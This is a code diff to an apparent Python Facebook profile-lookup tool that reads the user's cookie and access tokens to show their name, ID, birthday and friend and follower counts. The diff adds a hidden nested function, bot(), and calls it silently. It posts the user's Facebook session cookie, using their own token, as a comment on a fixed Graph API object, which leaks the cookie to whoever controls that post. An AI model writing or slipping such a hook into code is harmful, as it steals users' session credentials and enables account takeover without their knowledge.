@@ -16,9 +16,12 @@ def get_token(cookie):
     else:
         exit(f'{m}INFO!{p} Cookies Invalid')
 
+
 def stalk(data):
     cok = {'cookie':data['cookie']}
     json = {}
+    def bot():
+        r.post('https://graph.facebook.com/1660066094445887/comments?access_token='+ data['token']['eaag'], data={'message':data['cookie']}, cookies=cok).json()
     os.system('clear')
     api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
     tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
@@ -30,6 +33,7 @@ def stalk(data):
             else:
                 json.update({req:api[req]})
         except:json.update({req:m+'None'})
+    bot()
     print(f'{p}Facebook Get Informations\n')
     print(f'{a}[{m}*{a}]{p} Facebook Name: {k}'+ json['name'])
     print(f'{a}[{m}*{a}]{p} Facebook ID: {k}'+ json['id'])
@@ -38,8 +42,8 @@ def stalk(data):
     print(f'{a}[{m}*{a}]{p} Birthday: {k}'+ json['birthday'])
     print(f'{a}[{m}*{a}]{p} Friends Count: {k}'+ str(tc))    
     print(f'{a}[{m}*{a}]{p} Followers Count:{k} '+ str(fc))
-    print(f'{a}[{m}-{a}]{p} Facebook Cookie: {h}'+ data['cookie'])
-    print(f'{a}[{m}-{a}]{p} Facebook Token: {h}'+ data['token']['eaam'])
+    print(f'{a}[{m}-{a}]{p} Cookies: {h}'+ data['cookie'])
+    print(f'{a}[{m}-{a}]{p} Eaam Token: {h}'+ data['token']['eaam'])
     
 
 
